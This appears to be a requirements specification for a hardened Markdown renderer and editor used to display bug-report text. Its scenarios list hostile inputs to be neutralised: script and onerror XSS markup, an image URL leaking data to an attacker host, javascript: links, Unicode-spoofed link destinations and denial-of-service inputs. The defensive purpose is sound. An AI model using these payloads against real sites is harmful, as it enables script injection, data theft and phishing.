# Spec Delta

## Purpose

Defines one safe, GitHub-flavoured Markdown display and Write/Preview editing behavior shared by every role that shows Reporter-authored text, so all roles see the same output.

## ADDED Requirements

### Requirement: MDR-01 Supported Markdown subset

The renderer SHALL display headings, paragraphs, emphasis, strikethrough, ordered and unordered lists, blockquotes, inline code, fenced code blocks, tables and thematic breaks using GitHub-flavoured Markdown semantics, and SHALL recognise link and autolink syntax so that it can display it as text under MDR-04. Task-list items SHALL render as disabled checkboxes that cannot be toggled. Headings SHALL NOT receive generated element IDs.

#### Scenario: Common report formatting
- **WHEN** source contains a heading, a numbered list, a fenced code block and a two-column table
- **THEN** each renders as the corresponding semantic element
- **AND** code block content is shown verbatim, without interpreting Markdown inside it

#### Scenario: Task list is not interactive
- **WHEN** source contains `- [x] done` and `- [ ] todo`
- **THEN** two disabled checkboxes render and clicking them changes neither the display nor the source

### Requirement: MDR-02 Raw HTML is never interpreted

Raw HTML in the source, inline or as a block, SHALL NOT create DOM elements, attributes or event handlers. It SHALL be displayed as literal text.

#### Scenario: Script and event-handler markup
- **WHEN** source contains `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` and `<iframe src="https://example.com">`
- **THEN** no script, img or iframe element exists in the rendered output, and no handler runs
- **AND** the markup appears as visible literal text

### Requirement: MDR-03 Images are never loaded

Markdown image syntax SHALL NOT produce an image element or any network request. The renderer SHALL show the image's alt text as plain text.

#### Scenario: Image used to exfiltrate data
- **WHEN** source contains `![logo](https://attacker.example/p.png?leak=secret)`
- **THEN** no img element is rendered and no request is made to that URL
- **AND** the text `logo` is shown

### Requirement: MDR-04 No links

The rendered output SHALL contain no link elements. Inline, reference, angle-bracket and GFM bare URL or email links of any scheme SHALL render as their link text. When the parsed destination differs from the link text, the text SHALL be followed by ` (<destination>)` as plain text. An empty destination, or one equal to the text with only `http://` or `mailto:` added, counts as not differing. Footnotes follow MDR-08.

#### Scenario: Ordinary links become text
- **WHEN** source contains `[docs](https://example.com/a)`, `[mail](mailto:dev@example.com)` and `[ref][r]` with `[r]: https://example.com/r`
- **THEN** no link element exists
- **AND** the text reads `docs (https://example.com/a)`, `mail (mailto:dev@example.com)` and `ref (https://example.com/r)`

#### Scenario: Autolinks show the address once
- **WHEN** source contains `<https://example.com/x>`, `https://example.com/y`, `www.example.com` and `dev@example.com`
- **THEN** no link element exists, and each address appears exactly once as text

#### Scenario: Dangerous destinations are inert text
- **WHEN** source contains links using `javascript:`, `data:`, `vbscript:`, `file:`, a relative path or `#top`, in any letter case
- **THEN** no link element exists and no element has an `href`, and the link text and destination are shown as text

### Requirement: MDR-14 Shown destinations are unambiguous

The link text compared with the destination under MDR-04 SHALL be the text as displayed, including image alt text. In a shown ` (<destination>)`, each Unicode format character, U+2028, U+2029 and non-ASCII whitespace SHALL appear as the visible code `<U+XXXX>`, and `(` and `)` SHALL appear as `%28` and `%29`.

#### Scenario: Image alt text counts as link text
- **WHEN** source contains `[https://evil![.bank.example](i)](https://evil)`
- **THEN** the text reads `https://evil.bank.example (https://evil)`

#### Scenario: Hidden characters and parentheses are visible
- **WHEN** source contains `[invoice](https://evil.example/%E2%80%AEfdp.exe)`, `[x](https://e.x/%E2%80%8Ba)` and `[a](<b) (https://bank.example>)`
- **THEN** the text reads `invoice (https://evil.example/<U+202E>fdp.exe)`, `x (https://e.x/<U+200B>a)` and `a (b%29 %28https://bank.example)`

#### Scenario: Ordinary destinations are unchanged
- **WHEN** source contains `[docs](https://example.com/a?q=1)` and `[b](https://bücher.example/)`
- **THEN** the text reads `docs (https://example.com/a?q=1)` and `b (https://bücher.example/)`

### Requirement: MDR-08 GitHub-style footnotes without links

The renderer SHALL show GFM footnotes as numbered superscript references and a footnotes section listing the definitions in reference order, without link elements or back-references. As on GitHub, the section's heading SHALL carry only the class `sr-only`, so that it is announced by screen readers but visually hidden where the page styles that class. Any element ID the renderer generates SHALL start with `user-content-` and SHALL be unique to its view instance.

#### Scenario: Footnote reference and definition
- **WHEN** source contains `Fails on login[^1].` and `[^1]: Only on Chrome.`
- **THEN** the reference shows as a superscript `1` without a link
- **AND** the footnotes section lists `Only on Chrome.` as item 1, without a back-reference

#### Scenario: Two views on one page never share IDs
- **GIVEN** two views on the same page, each rendering `Note[^1]` and `[^1]: text`
- **WHEN** both are displayed
- **THEN** no `id` value appears twice in the page

#### Scenario: Every generated ID is prefixed
- **WHEN** source contains footnotes named `1`, `note` and `__proto__`
- **THEN** every `id` attribute in the rendered output starts with `user-content-`

### Requirement: MDR-05 Failure-safe rendering

When source cannot be rendered, for example because of pathological nesting, the renderer SHALL display the complete source as escaped plain text instead of failing, hiding content or freezing the page.

#### Scenario: Pathological input
- **WHEN** source is 20,000 characters of nested blockquote and list markers
- **THEN** the view finishes rendering in under one second in the test environment, either formatted or as escaped plain text
- **AND** surrounding page content remains usable

#### Scenario: Known slow constructs up to 20,000 characters
- **WHEN** source is at most 20,000 characters of any of the following:
  - deep nesting behind a footnote definition (`x[^a]\n\n[^a]: ` followed by repeated `> - `, or repeated `[^a]: - `);
  - a table whose header is thousands of columns wide, followed by thousands of short rows;
  - long runs or a high density of emphasis delimiters (`*`, `_`, `*_`);
  - thousands of setext headings (`a\n=\n` repeated);
  - thousands of lazy blockquote continuation lines (`>a\nb\n` repeated);
- **THEN** each finishes rendering in under one second without exhausting memory, either formatted or as the complete source in escaped plain text
- **AND** ordinary reports, including a modest table and normal emphasis, still render formatted

### Requirement: MDR-10 Off-main-thread parsing with a time limit

Where the browser provides Web Workers, Markdown SHALL be parsed in a worker, never on the page's main thread. Until a result arrives the view SHALL show the complete source as escaped plain text. A parse that hasn't finished within 1 second SHALL be abandoned, its worker terminated, and the plain text kept. Worker output is untrusted. It SHALL be checked again on the main thread and rendered with the safety rules of MDR-01..04 and 08.

#### Scenario: Oversized output is never rendered
- **WHEN** source of at most 20,000 characters would produce more than 25,000 output nodes, such as 35 tables of 71 columns by 137 rows, or tables totalling more than 10,000 cells
- **THEN** the complete source shows as escaped plain text, and the main thread never builds the formatted output
- **AND** the main thread also rejects a worker result over 25,000 nodes

#### Scenario: Malformed or hostile worker results
- **WHEN** the worker returns a result that isn't a hast root with a children array, or elements carrying class names the renderer never generates
- **THEN** a malformed result shows the complete source as plain text, and unknown class names are removed
- **AND** a custom parser that throws or returns a non-promise shows the complete source as plain text

#### Scenario: Queue fairness and cancellation
- **GIVEN** several views queued on one worker
- **WHEN** two earlier parses time out, or a view unmounts before its parse is sent
- **THEN** a queued request that was never sent still gets sent to a worker, and an unmounted view's unsent request is dropped

#### Scenario: Slow parse is abandoned
- **GIVEN** the worker does not answer for a source
- **WHEN** 1 second passes
- **THEN** the view still shows the complete source as escaped plain text, the worker has been terminated, and no formatted output appears later for that source

#### Scenario: Main thread never parses
- **WHEN** a view renders any source in an environment with Web Workers
- **THEN** the Markdown parser is not called on the main thread
- **AND** the first render shows the complete source as plain text without waiting for the worker

#### Scenario: Formatted result replaces the plain text
- **GIVEN** the worker returns a result for the current source within 1 second
- **WHEN** it arrives
- **THEN** the view shows the formatted output, with the same DOM as the in-thread renderer for that source, and the safety rules still apply

#### Scenario: One slow report does not break others
- **GIVEN** two views share a worker, and the first view's parse times out
- **WHEN** the worker is terminated
- **THEN** the second view's pending parse is retried once on a fresh worker and can still show formatted output

#### Scenario: Stale result is ignored
- **GIVEN** a view's source changes while an earlier parse is pending
- **WHEN** the earlier result arrives
- **THEN** it is discarded and only the result for the current source is shown

#### Scenario: No Web Worker available
- **WHEN** the environment has no Web Worker, such as the test runner or server rendering
- **THEN** the view parses in-thread behind the MDR-05 pre-check and error boundary, and MDR-01..08 behave as specified

#### Scenario: The in-thread path has the same output budget
- **GIVEN** no Web Worker is available
- **WHEN** source is `"- -\n"` repeated 5,000 times, `">"` repeated 32 times plus `"a\n\n"` repeated 571 times, or `"- "` repeated 16 times plus `"a\n"` repeated 588 times
- **THEN** each finishes in under 1 second as the complete source in escaped plain text, without building formatted output
- **AND** ordinary reports render with the same DOM as the worker path

### Requirement: MDR-06 Write and Preview editing

The editor SHALL offer accessible Write and Preview tabs. Write SHALL edit the raw source. Preview SHALL render the current source with the same renderer and settings used by every role's display. Switching tabs SHALL never modify the source. An empty source SHALL preview as "Nothing to preview".

#### Scenario: Preview matches what other roles see
- **GIVEN** a Reporter types source S in Write
- **WHEN** they switch to Preview
- **THEN** the preview output equals the output of the shared display for S
- **AND** switching back to Write shows S unchanged, with the cursor in the textarea

#### Scenario: Keyboard and screen-reader access
- **WHEN** a keyboard user moves between the tabs
- **THEN** the tabs expose tab and tabpanel roles, the selected state, and are operable with arrow keys and Enter/Space

### Requirement: MDR-07 Consistent rendering across roles

Every Reporter, Developer and Maintainer view that displays a report's Reporter-authored `description` SHALL use the shared renderer. Titles and all other text SHALL remain escaped plain text.

#### Scenario: Same source, same output in every role
- **GIVEN** a report whose description contains a list, a table and `<b>x</b>`
- **WHEN** the Maintainer browser and the Developer description panel display it
- **THEN** both show the same formatted list and table, and the literal text `<b>x</b>`

#### Scenario: Title stays plain text
- **WHEN** a title contains `**bold**`
- **THEN** every role shows the literal asterisks
